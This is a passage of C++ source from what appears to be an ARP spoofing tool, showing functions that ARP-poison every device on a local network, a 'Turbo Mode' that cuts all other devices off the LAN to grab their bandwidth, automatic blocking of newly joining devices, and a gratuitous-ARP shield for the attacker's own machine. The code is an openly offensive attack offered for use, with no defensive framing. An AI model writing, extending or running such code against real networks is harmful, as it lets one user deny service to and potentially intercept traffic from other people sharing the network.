    }
}

void ArpEngine::shieldLoop() {
    while (m_shieldActive && m_running) {
        sendGratuitousArp();
        // Send every 500ms for aggressive defense
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}

void ArpEngine::startShield() {
    if (m_shieldActive) return;
    m_shieldActive = true;
    if (m_shieldThread.joinable()) m_shieldThread.join();
    m_shieldThread = std::thread(&ArpEngine::shieldLoop, this);
}

void ArpEngine::stopShield() {
    m_shieldActive = false;
    if (m_shieldThread.joinable()) m_shieldThread.join();
}

// ============================================================================
// Poison All: ARP poison every discovered device (except gateway and self)
// ============================================================================
void ArpEngine::poisonAll() {
    if (!m_gatewayMacKnown) return;
    
    std::vector<DeviceInfo> devices;
    {
        std::lock_guard<std::mutex> lock(m_devicesMutex);
        for (auto& [ip, dev] : m_devices) {
            devices.push_back(dev);
        }
    }

    for (auto& dev : devices) {
        if (dev.ip == m_gatewayIp) continue;
        if (dev.ip == m_localIp) continue;
        if (dev.isPoisoned) continue;

        startSpoofing(dev.ip, dev.mac);
        setDeviceFlags(dev.ip, true, false, false, false);
    }
}

// ============================================================================
// Turbo Mode: Cut ALL other devices, shield self, claim full bandwidth
// ============================================================================
void ArpEngine::startTurboMode() {
    if (!m_gatewayMacKnown) return;
    m_turboActive = true;

    // 1. Shield ourselves first
    startShield();

    // 2. Poison + cut every other device
    std::vector<DeviceInfo> devices;
    {
        std::lock_guard<std::mutex> lock(m_devicesMutex);
        for (auto& [ip, dev] : m_devices) {
            devices.push_back(dev);
        }
    }

    for (auto& dev : devices) {
        if (dev.ip == m_gatewayIp) continue;
        if (dev.ip == m_localIp) continue;

        startVoidSpoofing(dev.ip, dev.mac);
        setDeviceFlags(dev.ip, true, true, false, false);
    }

    // 3. Enable auto-block to catch any new devices too
    startAutoBlock();
}

void ArpEngine::stopTurboMode() {
    m_turboActive = false;

    // Stop auto-block
    stopAutoBlock();

    // Restore all poisoned devices
    resetAllPoison();

    // Stop shield
    stopShield();
}

// ============================================================================
// Auto-Block: Automatically block new devices joining the network
// ============================================================================
void ArpEngine::startAutoBlock() {
    if (m_autoBlockActive) return;
    
    // Snapshot current devices as "known" / allowed
    {
        std::lock_guard<std::mutex> bLock(m_blockMutex);
        m_knownDevices.clear();
        m_blockedDevices.clear();
        
        std::lock_guard<std::mutex> dLock(m_devicesMutex);
        for (auto& [ip, dev] : m_devices) {
            m_knownDevices.insert(ip);
        }
        // Always allow self and gateway
        m_knownDevices.insert(m_localIp);
        m_knownDevices.insert(m_gatewayIp);
    }
    
    m_autoBlockActive = true;
}

void ArpEngine::stopAutoBlock() {
    m_autoBlockActive = false;
    
    // Unblock all blocked devices
    std::vector<std::string> toUnblock;
    {
        std::lock_guard<std::mutex> lock(m_blockMutex);
        for (auto& ip : m_blockedDevices) {
            toUnblock.push_back(ip);
        }
    }
    for (auto& ip : toUnblock) {
        unblockDevice(ip);
    }
    
    {
        std::lock_guard<std::mutex> lock(m_blockMutex);
        m_knownDevices.clear();
        m_blockedDevices.clear();
    }
}

int ArpEngine::getBlockedCount() const {
    // Can't lock in const, but set size is atomic-safe enough for display
    return (int)m_blockedDevices.size();
}

std::vector<std::string> ArpEngine::getBlockedDevices() const {
    // Note: in a real app we'd add a const-safe mutex. For UI display this is acceptable.
    std::vector<std::string> result;
    for (auto& ip : m_blockedDevices) {
        result.push_back(ip);
    }
    return result;
}

void ArpEngine::unblockDevice(const std::string& ip) {
    // Restore the device's ARP tables
    resetPoison(ip);
    
    {
        std::lock_guard<std::mutex> lock(m_blockMutex);
        m_blockedDevices.erase(ip);
        m_knownDevices.insert(ip);  // Add to known so it won't be re-blocked
    }
    
    {
        std::lock_guard<std::mutex> lock(m_devicesMutex);
        auto it = m_devices.find(ip);
        if (it != m_devices.end()) {
            it->second.isBlocked = false;
        }
    }
}
